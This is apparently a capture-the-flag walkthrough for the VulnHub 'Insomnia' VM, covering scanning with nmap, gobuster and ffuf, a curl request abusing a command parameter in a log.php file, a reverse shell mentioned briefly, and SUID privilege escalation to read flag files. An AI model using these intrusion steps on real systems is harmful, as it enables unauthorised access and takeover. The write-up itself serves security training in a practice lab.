<p>A professional penetration testing walkthrough for the <strong>Insomnia</strong> VM on VulnHub.</p>
<p><strong>Author:</strong> Your Name</p>
<p><strong>Date:</strong> May 2025</p>

<hr>

<h2>📘 Table of Contents</h2>

<ul>
  <li><a href="#overview">Overview</a></li>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#web-application-analysis">Web Application Analysis</a></li>
  <li><a href="#initial-foothold">Initial Foothold</a></li>
  <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  <li><a href="#flags">Flags</a></li>
</ul>

<hr>

<h2 id="overview">📝 Overview</h2>

<p>The goal of this walkthrough is to capture all available flags from the VulnHub <strong>Insomnia</strong> virtual machine by exploiting weaknesses through enumeration, web analysis, and privilege escalation.</p>

<hr>

<h2 id="enumeration">🔍 Enumeration</h2>

<h3>Host Discovery</h3>

<p>First, we used <code>netdiscover</code> to find the IP address of the target VM.</p>

<img src="screenshots/01-netdiscover.png" alt="Netdiscover Output" width="600"/>

<h3>Port Scanning</h3>

<p>Performed a comprehensive port scan using <code>nmap</code>:</p>

<pre><code>nmap -sV -sC -T4 -p- 192.168.0.102</code></pre>

<img src="screenshots/02-nmap-full-scan.png" alt="Nmap Scan Output" width="600"/>

<p>This revealed a web server running on port 80.</p>

<hr>

<h2 id="web-application-analysis">🌐 Web Application Analysis</h2>

<h3>Initial Access</h3>

<p>Accessing <code>http://192.168.0.102</code> presents a default Apache web page.</p>

<img src="screenshots/03-apache-default.png" alt="Apache Default Page" width="600"/>

<h3>Directory Bruteforce</h3>

<p>Ran <code>gobuster</code> to enumerate hidden directories:</p>

<pre><code>gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/common.txt</code></pre>

<img src="screenshots/04-gobuster-logfiles.png" alt="Gobuster Results" width="600"/>

<p>Found <code>/logfiles/</code> directory.</p>

<h3>FFUF for Deeper Discovery</h3>

<pre><code>ffuf -u http://192.168.0.102/logfiles/FUZZ -w /usr/share/wordlists/dirb/common.txt</code></pre>

<img src="screenshots/05-ffuf-logs.png" alt="FFUF Results" width="600"/>

<p>This yielded accessible log files.</p>

<hr>

<h2 id="initial-foothold">🚪 Initial Foothold</h2>

<p>Examined <code>logfiles/</code> contents and found a <code>.php</code> file containing system commands, suggesting an RCE vulnerability.</p>

<img src="screenshots/06-rce-discovered.png" alt="Log File with RCE" width="600"/>

<pre><code>curl http://192.168.0.102/logfiles/log.php?cmd=id</code></pre>

<p>This confirmed code execution as the web user.</p>

<hr>

<h2 id="privilege-escalation">⬆️ Privilege Escalation</h2>

<p>After spawning a reverse shell using <code>bash -i</code>, privilege escalation was performed via SUID binaries.</p>

<img src="screenshots/07-suid-check.png" alt="SUID Check" width="600"/>

<pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>

<p>Found unusual SUID binary <code>/opt/insomnia/bin/rootme</code>.</p>

<pre><code>/opt/insomnia/bin/rootme</code></pre>

<img src="screenshots/08-root-shell.png" alt="Root Shell" width="600"/>

<p>This granted a root shell.</p>

<hr>

<h2 id="flags">🏁 Flags</h2>

<h3>User Flag</h3>

<pre><code>cat /home/insomnia/user.txt</code></pre>

<img src="screenshots/09-user-flag.png" alt="User Flag" width="600"/>

<h3>Root Flag</h3>

<pre><code>cat /root/root.txt</code></pre>

<img src="screenshots/10-root-flag.png" alt="Root Flag" width="600"/>

<hr>

<p>💥 <strong>Mission accomplished!</strong> Root access and all flags captured.</p>
